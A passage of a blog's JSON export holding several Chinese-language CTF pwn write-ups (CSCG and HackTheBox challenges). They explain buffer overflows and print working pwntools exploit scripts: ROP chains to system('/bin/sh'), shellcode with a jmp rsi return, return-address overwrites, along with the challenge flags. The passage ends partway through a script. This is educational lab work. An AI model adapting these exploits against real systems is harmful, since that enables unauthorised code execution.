Writeup","slug":"CTF/Pwn/CSCG-2025-Intro-to-pwn-Writeup","date":"2025-06-18T20:18:48.000Z","updated":"2025-06-18T22:27:12.930Z","comments":true,"path":"2025/06/18/CTF/Pwn/CSCG-2025-Intro-to-pwn-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/06/18/CTF/Pwn/CSCG-2025-Intro-to-pwn-Writeup/","excerpt":"","text":"题目这道题给了源代码： 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;// --------------------------------------------------- SETUPvoid ignore_me_init_buffering()&#123; setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0);&#125;// --------------------------------------------------- VULNERABLE FUNCTIONvoid win()&#123; system(&quot;echo no cat /flag for you&quot;);&#125;void vuln() &#123; char name[16]; printf(&quot;What is your name?\\n&quot;); gets(name); printf(&quot;Hello %s!\\nI have a present for you: %d\\n&quot;, name, 0xc35f);&#125;// --------------------------------------------------- MAINint main(int argc, char **argv)&#123; (void)argc; (void)argv; ignore_me_init_buffering(); vuln(); return 0;&#125; 观察/分析通过阅读源代码即可发现这道题的核心漏洞： 123char name[16];printf(&quot;What is your name?\\n&quot;);gets(name); 即利用Buffer Overflow。 首先注意到，虽然说直接调用win()函数并没有任何实际意义，因为它不能帮我们读取flag。但是我们可以利用win()里调用的system()函数。 所以我们现在的思路就是想办法调用system()函数并传入/bin/sh作为参数。 首先利用pwntools里的一个函数 12345678from pwn import *elf = context.binary = ELF(&#x27;./intro-pwn&#x27;, checksec=False)p = elf.process()pop_rdi = next(elf.search(asm(&#x27;pop rdi ; ret&#x27;)))print(pop_rdi)# 4198917 可以确定这个程序某个地方使用了pop rdi ; ret命令并可以找到它的地址。 先来解释一下这个命令：pop rdi ; ret 会从当前栈顶取出一个值放入 rdi 寄存器（即函数第 1 个参数），然后跳转到下一个地址继续执行。 在 x86-64 System V 调用约定中，函数的第一个参数通过 rdi 传递，它传的是值，不是地址；如果这个值是地址类型（如指针），函数内部才会用它当作地址来读取内容。 而ret命令具体执行的内容是： 从 [rsp] 取 8 字节 → 赋值给 rip（指令指针） rsp += 8 所以我们可以利用这个命令构造一条这样的ROP链： 123payload += p64(pop_rdi)payload += p64(input_add)payload += p64(function_add) 123[RSP] → pop_rdi ; 第一次 ret 跳进这个 gadget[RSP+8] → input_add ; 会被 pop 到 rdi[RSP+16] → function_add ; 再 ret 到这个地址，跳进我们指定的 function_add 相当于执行了 1function(input) 不过要注意一点：pop rdi 从栈上弹出 8 字节，这个值将被视为 “地址”。也就是说我们无法直接通过这个命令将/bin/sh作为参数传递给system()函数，而是需要将整个过程分2步： 通过调用gets()函数先将/bin/sh写入到data段里的某个地方（我们给定的地址）； 将刚才被写入的地址作为参数传给system()。 最后再来确认一下Stack的结构以及我们前面提到的需要的各个地址： 在IDA里点击vuln()函数的name： 确认一开始的填充为 12payload = b&quot;A&quot;*16payload += b&quot;B&quot;*8 通过Alt+t搜索system，data，gets可以确定： system的地址： 1sys_add = 0x401040 gets()的地址： Data段开始的地址： 1data_add = 0x404028 Exploit12345678910111213141516171819202122232425262728293031323334from pwn import *elf = context.binary = ELF(&#x27;./intro-pwn&#x27;, checksec=False)p = elf.process()sys_add = 0x401040gets_add = 0x401060data_add = 0x404028pop_rdi = next(elf.search(asm(&#x27;pop rdi ; ret&#x27;)))# 第一轮ROPpayload = b&quot;A&quot;*16payload += b&quot;B&quot;*8# 将data块的地址作为参数传递给gets函数并调用gets# 将&quot;/bin/sh&quot;写入data块payload += p64(pop_rdi)payload += p64(data_add)payload += p64(gets_add)# 第二轮ROP# 将刚写入的data里的&quot;/bin/sh&quot;作为参数传递给system()函数payload += p64(pop_rdi)payload += p64(data_add)payload += p64(sys_add)# 发送p.sendlineafter(b&#x27;name?\\n&#x27;, payload)p.sendline(b&quot;/bin/sh&quot;)p.interactive()","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/en/tags/Pwn/"}]},{"title":"HTB Regularity Writeup","slug":"CTF/Pwn/HTB-Regularity-Writeup","date":"2025-06-11T19:43:48.000Z","updated":"2025-08-21T09:20:34.143Z","comments":true,"path":"2025/06/11/CTF/Pwn/HTB-Regularity-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/06/11/CTF/Pwn/HTB-Regularity-Writeup/","excerpt":"ret2reg。通过Buffer Overflow将返回地址修改成我们自己手写的/bin/sh命令。","text":"题目 观察分析开始的开始我们先确认一下这份文件的安全性措施有哪些： 12345678910└─$ checksec regularity[*] &#x27;/home/archer/ctf-kali/regularity&#x27; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable RWX: Has RWX segments Stripped: No 注意到这个程序并没有NX（No-eXecute）措施，这会成为我们后续攻击的最核心的前提条件！ 用IDA打开文件： 这个read()比较可疑，但是在伪代码页面没有找到漏洞，所以我们转去查看汇编。 在IDA一开始的这个默认页面双击read： 可以发现程序分配了0x100位的Buffer，但是却读取了0x110位数据。也就是说我们可以利用这个Buffer Overflow的漏洞。 但是由于在Exports页面没有找到任何可以利用的函数： 所以这道题我们需要另辟蹊径。 我们回来重新仔细看一下read()函数的汇编代码： 1234567891011121314151617181920212223; signed __int64 read()read proc nearbuf = byte ptr -100h ; 定义一个局部变量 buf，大小 0x100（256 字节）sub rsp, 100h ; 分配 0x100 字节栈空间，rsp 向下移动，留出 buffer 空间mov eax, 0 ; syscall 编号 0 → sys_readmov edi, 0 ; 参数 rdi = 0 → 文件描述符 0（stdin）lea rsi, [rsp+100h+buf] ; rsi = rsp，即 buffer 的地址（rsp + 0 = rsp） ; 相当于 rsi = rsp → 第 2 个参数，读取的目标缓冲区mov edx, 110h ; 第 3 个参数 → 读取长度为 0x110（272 字节） ; 但 buffer 只有 0x100 → 产生 16 字节栈溢出漏洞！syscall ; 执行系统调用 read(0, rsp, 0x110)add rsp, 100h ; 恢复栈指针，释放局部变量空间retn ; 返回调用者（但可能已被覆盖）read endp 注意到rsi 是当前buffer的起始地址。而同时在阅读main()函数的汇编时可以发现这行命令： 1jmp rsi 所以我们可以写入一段自己手写的/bin/sh命令的汇编代码，并将返回地址修改成rsi，这样程序就会自动运行我们手写的/bin/sh命令。（不过要注意，这个攻击能够奏效最核心的前提是栈是可执行的，即没有NX（No-eXecute）。） Exploit这道题在Windows系统里做和在Linux里不太一样，所以我会分别介绍他们所需的操作。 Linux首先讲在Linux系统下的解题过程，因为可以用便携的命令 1next(elf.search(asm(&#x27;jmp rsi&#x27;))) 这个命令的作用是： asm(&#39;jmp rsi&#39;)：将汇编指令 jmp rsi 转换为机器码（字节码）； elf.search(...)：在目标 ELF 文件中搜索包含这段机器码的地址（也就是查找 gadget）； next(...)：获取搜索到的第一个结果，即 jmp rsi 的实际地址； 而 1asm(shellcraft.sh()) 这个命令是 PwnTools 库中提供的一个自动生成 shellcode 的便捷方法，具体作用如下： shellcraft.sh()：生成一段用于执行 /bin/sh 的汇编代码（默认适用于当前脚本所处平台（这里是Linux）的 64 位 execve(&quot;/bin/sh&quot;, NULL, NULL) 系统调用）； asm(...)：将上面的汇编代码转换为真实的机器码（也就是可以直接执行的 shellcode 字节串）； 这个命令是在Windows里也可以使用的，只不过需要点额外的声明。 Exploit代码： 1234567891011121314151617181920212223242526272829from pwn import *elf = context.binary = ELF(&#x27;./regularity&#x27;, checksec=False)# p = process()# 这里的p是用于本地测试的，只能在Linux上使用，这个这个文件是elf格式的。r = remote(&quot;94.237.51.163&quot;,52671)# 找到 jmp rsi 指令地址JMP_RSI = next(elf.search(asm(&#x27;jmp rsi&#x27;)))# 构造 payload：shellcode + 溢出 + jmp rsi 地址payload = flat(&#123; 0: asm(shellcraft.sh()), # shellcode 256: JMP_RSI # 溢出 return address&#125;)# p.sendlineafter(b&#x27;days?\\n&#x27;, payload)# p.interactive()r.sendlineafter(b&#x27;days?\\n&#x27;, payload)r.interactive()# $ ls# core# flag.txt# regularity# $ cat flag.txt# HTB&#123;jMp_rSi_jUmP_aLl_tH3_w4y!&#125; 解释一下flat()这个函数： 它把一个结构化的数据（如字节串、整数、地址、dict 布局）转换成连续的 bytes 类型，供你发送或写入程序。用于自动构造二进制 payload。 这段代码： 1234payload = flat(&#123; 0: asm(shellcraft.sh()), # shellcode 256: JMP_RSI # 覆盖 return address&#125;) 传入的是一个 字典（dict）结构，表示希望构造一个内存布局： 从 offset 0 开始：放入 shellcode 从 offset 256 开始：放入跳转地址 JMP_RSI（会被自动转成小端格式） 而flat() 会自动： 计算出 offset 之间的 padding（自动补零或 NOP） 把整数 JMP_RSI 自动转换为 64 位小端地址（等价于 p64(JMP_RSI)） 最终拼接出一段完整的、可发送的 payload 而且它会自动把JMP_RSI的值转成小端序（Liitle-Endian），不需要我们额外使用p64()函数。 当程序执行ret时，RIP被改成JMP_RSI，CPU开始执行jmp rsi。这条指令的含义是：跳到RSI指向的地址继续执行。此时RSI里还保留着刚才缓冲区的地址，所以会跳转到缓冲区的开头执行我们放在里面的shellcode。 Windows因为在Windows里我们无法使用 1next(elf.search(asm(&#x27;jmp rsi&#x27;))) 这个命令，所以需要手动查找jmp rsi的地址。 这里介绍3种方法： 1. 在主页面就可以直接查看。用鼠标点击 1jmp rsi 这行命令，然后会在页面下方看到地址： 2. 使用快捷键Alt+t搜索 1rsi 或者 1jmp rsi （注意是5个空格，多了少了都搜不出来。） 3. 点击左上角的菜单View，然后依次选择Open subviews里的Disassembly： 再往下翻手动查找到： 确定地址了之后剩下的就和之前的一样了： 123456789101112131415161718192021222324252627from pwn import *r = remote(&quot;94.237.51.163&quot;,52671)# 明确设置架构和 OS 平台，否则asm(shellcraft.sh())会出问题（写的内容会是windows架构下的命令）。context.arch = &#x27;amd64&#x27;context.os = &#x27;linux&#x27;# 找到的 jmp rsi 指令地址JMP_RSI = 0x401041# 构造 payload：shellcode + 溢出 + jmp rsi 地址payload = flat(&#123; 0: asm(shellcraft.sh()), # shellcode 256: JMP_RSI # 溢出 return address&#125;)r.sendlineafter(b&#x27;days?\\n&#x27;, payload)r.interactive()# [*] Switching to interactive mode# ls# core# flag.txt# regularity# cat flag.txt# HTB&#123;jMp_rSi_jUmP_aLl_tH3_w4y!&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/en/tags/Pwn/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://archer-baiyi.github.io/en/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"HTB Getting_Started Writeup","slug":"CTF/Pwn/HTB-Getting-Started-Writeup","date":"2025-06-10T11:56:50.000Z","updated":"2025-06-10T19:03:24.626Z","comments":true,"path":"2025/06/10/CTF/Pwn/HTB-Getting-Started-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/06/10/CTF/Pwn/HTB-Getting-Started-Writeup/","excerpt":"通过Buffer Overflow来修改目标变量的值。","text":"题目 观察分析用IDA打开文件： 注意到这道题最核心的漏洞： 1__isoc99_scanf(&amp;unk_26E1, s); 原本只给s分配了8位的缓冲区（char s[8];），而scanf是没有长度限制的，所以可以利用Buffer Overflow。 查看win()函数： 发现会直接读取flag。 所以我们需要做的就是绕过这个if检测： 1234if ( v25 == 3735928559LL ) putchar(32);else win(); 通过Buffer Overflow覆盖掉v25的值即可。 最后再来查看一下当前main()函数的Stack结构（直接点击v25）： 发现从s到v24一共有40位（=-0x08 - (-0x30) = -8 + 3*16 = -8 + 48），而v25一共占8位。 Exploit这道题它给了一个python的模板。 12345678910111213141516171819202122232425#!/usr/bin/python3.8&#x27;&#x27;&#x27;You need to install pwntools to run the script.To run the script: python3 ./wrapper.py&#x27;&#x27;&#x27;# Libraryfrom pwn import *# Open connectionIP = &#x27;94.237.57.57&#x27; # Change thisPORT = 52438 # Change thisr = remote(IP, PORT)# Craft payloadpayload = b&#x27;A&#x27; *(3*16-8) # Change the number of &quot;A&quot;s 覆盖了s,v21,v22,v23,v24payload += b&quot;B&quot; * 8 # 覆盖v25# Send payloadr.sendline(payload)# Read flagsuccess(f&#x27;Flag --&gt; &#123;r.recvline_contains(b&quot;HTB&quot;).strip().decode()&#125;&#x27;)# [+] Flag --&gt; HTB&#123;b0f_tut0r14l5_4r3_g00d&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/en/tags/Pwn/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://archer-baiyi.github.io/en/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"HTB Questionnaire Writeup","slug":"CTF/Pwn/HTB-Questionnaire-Writeup","date":"2025-06-09T18:43:50.000Z","updated":"2025-06-10T19:04:03.242Z","comments":true,"path":"2025/06/09/CTF/Pwn/HTB-Questionnaire-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/06/09/CTF/Pwn/HTB-Questionnaire-Writeup/","excerpt":"一些关于Pwn的基础知识。（包括一些pwn常用的Linux命令）","text":"题目 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;/*This is not the challenge, just a template to answer the questions.To get the flag, answer the questions. There is no bug in the questionnaire.*/void gg()&#123; system(&quot;cat flag.txt&quot;);&#125;void vuln()&#123; char buffer[0x20] = &#123;0&#125;; fprintf(stdout, &quot;\\nEnter payload here: &quot;); fgets(buffer, 0x100, stdin);&#125;void main()&#123; vuln();&#125; 这道题并不需要我们去exploit任何程序，只需要回答一些关于这个程序基础的问题。 解第一题123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263This is a simple questionnaire to get started with the basics.◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉ ◉◉ When compiling C/C++ source code in Linux, an ELF (Executable and Linkable Format) file is created. ◉◉ The flags added when compiling can affect the binary in various ways, like the protections. ◉◉ Another thing affected can be the architecture and the way it&#x27;s linked. ◉◉ ◉◉ If the system in which the challenge is compiled is x86_64 and no flag is specified, ◉◉ the ELF would be x86-64 / 64-bit. If it&#x27;s compiled with a flag to indicate the system, ◉◉ it can be x86 / 32-bit binary. ◉◉ ◉◉ To reduce its size and make debugging more difficult, the binary can be stripped or not stripped. ◉◉ ◉◉ Dynamic linking: ◉◉ ◉◉ A pointer to the linked file is included in the executable, and the file contents are not included ◉◉ at link time. These files are used when the program is run. ◉◉ ◉◉ Static linking: ◉◉ ◉◉ The code for all the routines called by your program becomes part of the executable file. ◉◉ ◉◉ Stripped: ◉◉ ◉◉ The binary does not contain debugging information. ◉◉ ◉◉ Not Stripped: ◉◉ ◉◉ The binary contains debugging information. ◉◉ ◉◉ The most common protections in a binary are: ◉◉ ◉◉ Canary: A random value that is generated, put on the stack, and checked before that function is ◉◉ left again. If the canary value is not correct-has been changed or overwritten, the application will ◉◉ immediately stop. ◉◉ ◉◉ NX: Stands for non-executable segments, meaning we cannot write and execute code on the stack. ◉◉ ◉◉ PIE: Stands for Position Independent Executable, which randomizes the base address of the binary ◉◉ as it tells the loader which virtual address it should use. ◉◉ ◉◉ RelRO: Stands for Relocation Read-Only. The headers of the binary are marked as read-only. ◉◉ ◉◉ Run the &#x27;file&#x27; command in the terminal and &#x27;checksec&#x27; inside the debugger. ◉◉ ◉◉ The output of &#x27;file&#x27; command: ◉◉ ◉◉ ✗ file test ◉◉ test: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, ◉◉ interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5a83587fbda6ad7b1aeee2d59f027a882bf2a429, ◉◉ for GNU/Linux 3.2.0, not stripped. ◉◉ ◉◉ The output of &#x27;checksec&#x27; command: ◉◉ ◉◉ gef➤ checksec ◉◉ Canary : ✘ ◉◉ NX : ✓ ◉◉ PIE : ✘ ◉◉ Fortify : ✘ ◉◉ RelRO : Partial ◉◉ ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉ 1234567891011[*] Question number 0x1:Is this a &#x27;32-bit&#x27; or &#x27;64-bit&#x27; ELF? (e.g. 1337-bit)&gt;&gt; 64-bit♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠♠ ♠♠ Correct ♠♠ ♠♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ 可以直接用IDA打开程序并且查看Exports页面，根据地址的长度判断这个程序是32位的还是64位的。这里的是64位的程序。 第二题1234567891011[*] Question number 0x2:What&#x27;s the linking of the binary? (e.g. static, dynamic)&gt;&gt; dynamic♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠♠ ♠♠ Correct ♠♠ ♠♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ 可以在linux里使用file命令： 12└─$ file testtest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5a83587fbda6ad7b1aeee2d59f027a882bf2a429, for GNU/Linux 3.2.0, not stripped 可以看到是dynamic的。 dynamically linked（动态链接）是指一个程序在运行时才加载它所依赖的共享库（通常是 .so 文件，例如 libc.so.6）。这是现代 Linux 系统中最常用的链接方式。 第三题1234567891011[*] Question number 0x3:Is the binary &#x27;stripped&#x27; or &#x27;not stripped&#x27;?&gt;&gt; not stripped♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠♠ ♠♠ Correct ♠♠ ♠♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ stripped 是指在编译完成后，调试符号（函数名、变量名、段名等）被移除了。目的是让程序更小、更难逆向分析。 同样可以在这个结果里看到： 12└─$ file testtest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5a83587fbda6ad7b1aeee2d59f027a882bf2a429, for GNU/Linux 3.2.0, not stripped 同样也可以用IDA来判断。用IDA打开程序后如果能看到类似于vuln()、gg()类似原始的函数名，那么说明这个程序是not stripped 的。如果看到sub_400123、func_4010a0之类的函数名，说明是 stripped的。 第四题1234567891011[*] Question number 0x4:Which protections are enabled (Canary, NX, PIE, Fortify)?&gt;&gt; NX♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠♠ ♠♠ Correct ♠♠ ♠♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ 可以在一开始返回的这里看到： 或者自己用checksec命令： 12345678910└─$ checksec test[*] &#x27;/home/test&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) SHSTK: Enabled IBT: Enabled Stripped: No 第五题12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉ ◉◉ Great job so far! Now it&#x27;s time to see some C code and a binary file. ◉◉ ◉◉ In the pwn_questionnaire.zip there are two files: ◉◉ ◉◉ 1. test.c ◉◉ 2. test ◉◉ ◉◉ The &#x27;test.c&#x27; is the source code and &#x27;test&#x27; is the output binary. ◉◉ ◉◉ Let&#x27;s start by analyzing the code. ◉◉ First of all, let&#x27;s focus on the &#x27;#include &lt;stdio.h&gt;&#x27; line. ◉◉ It includes the &#x27;stdio.h&#x27; header file to use some of the standard functions like &#x27;printf()&#x27;. ◉◉ The same principle applies for the &#x27;#include &lt;stdlib.h&gt;&#x27; line, for other functions like &#x27;system()&#x27;. ◉◉ ◉◉ Now, let&#x27;s take a closer look at: ◉◉ ◉◉ void main()&#123; ◉◉ vuln(); ◉◉ &#125; ◉◉ ◉◉ By default, a binary file starts executing from the &#x27;main()&#x27; function. ◉◉ ◉◉ In this case, &#x27;main()&#x27; only calls another function, &#x27;vuln()&#x27;. ◉◉ The function &#x27;vuln()&#x27; has 3 lines. ◉◉ ◉◉ void vuln()&#123; ◉◉ char buffer[0x20] = &#123;0&#125;; ◉◉ fprintf(stdout, &quot;\\nEnter payload here: &quot;); ◉◉ fgets(buffer, 0x100, stdin); ◉◉ &#125; ◉◉ ◉◉ The first line declares a 0x20-byte buffer of characters and fills it with zeros. ◉◉ The second line calls &#x27;fprintf()&#x27; to print a message to stdout. ◉◉ Finally, the third line calls &#x27;fgets()&#x27; to read 0x100 bytes from stdin and store them to the ◉◉ aformentioned buffer. ◉◉ ◉◉ Then, there is a custom &#x27;gg()&#x27; function which calls the standard &#x27;system()&#x27; function to print the ◉◉ flag. This function is never called by default. ◉◉ ◉◉ void gg()&#123; ◉◉ system(&quot;cat flag.txt&quot;); ◉◉ &#125; ◉◉ ◉◉ Run the &#x27;man &lt;function_name&gt;&#x27; command to see the manual page of a standard function (e.g. man fgets).◉◉ ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉ 123456789101112[*] Question number 0x5:What is the name of the custom function the gets called inside `main()`? (e.g. vulnerable_function())&gt;&gt; vuln()♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠♠ ♠♠ Correct ♠♠ ♠♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ 第六题1234567891011[*] Question number 0x6:What is the size of the &#x27;buffer&#x27; (in hex or decimal)?&gt;&gt; 0x20♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠♠ ♠♠ Correct ♠♠ ♠♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ 在一开始给的c代码里就可以看到： 12345void vuln()&#123; char buffer[0x20] = &#123;0&#125;; fprintf(stdout, &quot;\\nEnter payload here: &quot;); fgets(buffer, 0x100, stdin);&#125; 也可以查看用IDA查看这个程序的Stack结构： 点击变量s： __saved_registers前全都是buffer的内容，即长度为 10000000000000020 - 0000000000000000 = 0x20 第七题12345[*] Question number 0x7:Which custom function is never called? (e.g. vuln())&gt;&gt; gg() 可以看到main()函数中没有直接调用gg()这个函数。 第八题12345678910111213141516171819202122232425262728293031◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉ ◉◉ Excellent! Now it&#x27;s time to talk about Buffer Overflows. ◉◉ ◉◉ Buffer Overflow means there is a buffer of characters, integers or any other type of variables, ◉◉ and someone inserts into this buffer more bytes than it can store. ◉◉ ◉◉ If the user inserts more bytes than the buffer&#x27;s size, they will be stored somewhere in the memory ◉◉ after the address of the buffer, overwriting important addresses for the flow of the program. ◉◉ This, in most cases, will make the program crash. ◉◉ ◉◉ When a function is called, the program knows where to return because of the &#x27;return address&#x27;. If the ◉◉ player overwrites this address, they can redirect the flow of the program wherever they want. ◉◉ To print a function&#x27;s address, run &#x27;p &lt;function_name&gt;&#x27; inside &#x27;gdb&#x27;. (e.g. p main) ◉◉ ◉◉ gef➤ p gg ◉◉ $1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x401176 &lt;gg&gt; ◉◉ ◉◉ To perform a Buffer Overflow in the simplest way, we take these things into consideration. ◉◉ ◉◉ 1. Canary is disabled so it won&#x27;t quit after the canary address is overwritten. ◉◉ 2. PIE is disabled so the addresses of the binary functions are not randomized and the user knows ◉◉ where to return after overwritting the return address. ◉◉ 3. There is a buffer with N size. ◉◉ 4. There is a function that reads to this buffer more than N bytes. ◉◉ ◉◉ Run printf &#x27;A%.0s&#x27; &#123;1..30&#125; | ./test to enter 30*&quot;A&quot; into the program. ◉◉ ◉◉ Run the program manually with &quot;./test&quot; and insert 30*A, then 39, then 40 and see what happens. ◉◉ ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉ 1234567891011[*] Question number 0x8:What is the name of the standard function that could trigger a Buffer Overflow? (e.g. fprintf())&gt;&gt; fgets()♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠♠ ♠♠ Correct ♠♠ ♠♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ 第九题12345678910111213[*] Question number 0x9:Insert 30, then 39, then 40 &#x27;A&#x27;s in the program and see the output.After how many bytes a Segmentation Fault occurs (in hex or decimal)?&gt;&gt; 40♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠♠ ♠♠ Correct ♠♠ ♠♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ 通过Stack的结构可以直接计算出来： 10x20 + 8 = 32 + 8 = 40 第十题123456789101112131415[*] Question number 0xa:What is the address of &#x27;gg()&#x27; in hex? (e.g. 0x401337)&gt;&gt; 0x401176♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠♠ ♠♠ Correct ♠♠ ♠♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠Great job! It&#x27;s high time you solved your first challenge! Here is the flag!HTB&#123;l34rn_th3_b451c5_b3f0r4_u_5t4rt&#125; 在Export页面就可以直接查看了：","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/en/tags/Pwn/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://archer-baiyi.github.io/en/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"HTB You_know_0xDiablos Writeup","slug":"CTF/Pwn/HTB-You-know-0xDiablos-Writeup","date":"2025-06-09T16:10:40.000Z","updated":"2025-08-18T21:57:19.218Z","comments":true,"path":"2025/06/09/CTF/Pwn/HTB-You-know-0xDiablos-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/06/09/CTF/Pwn/HTB-You-know-0xDiablos-Writeup/","excerpt":"通过Buffer Overflow修改返回地址以调用目标函数并传递参数。","text":"题目 观察用IDA打开文件： 查看vuln()发现gets()漏洞： 除此之外并没有别的发现了，所以查看Exports： 发现一个很可疑的flag函数： 发现只要调用这个函数的时候传递了合适的参数便可以直接获得flag。 最后再来查看一下vuln()的Stack的结构： （上面是180位的s） 以及flag的Stack的结构： 注意到 1+0000000000000000 _DWORD __saved_registers; 的地址是0，所以说我们只需要管（填充覆盖）后面的部分，即： 123+0000000000000004 _UNKNOWN *__return_address;+0000000000000008 _DWORD arg_0;+000000000000000C _DWORD arg_4; Exploit12345678910111213141516171819202122232425from pwn import *r = remote(&quot;94.237.54.192&quot;, 43134)a1 = -559038737a2 = -1059139571a1_hex = p32(a1, signed=True)a2_hex = p32(a2, signed=True)response = r.recvline()# print(response)payload = b&quot;A&quot; * (180+4+4) # 覆盖 buffer + 旧 EBPpayload += p32(0x080491E2) # 覆盖返回地址为 flag() 地址payload += b&quot;B&quot; * 4 # 覆盖return_address的Paddingpayload += a1_hex # 第一个参数 (a1)payload += a2_hex # 第二个参数 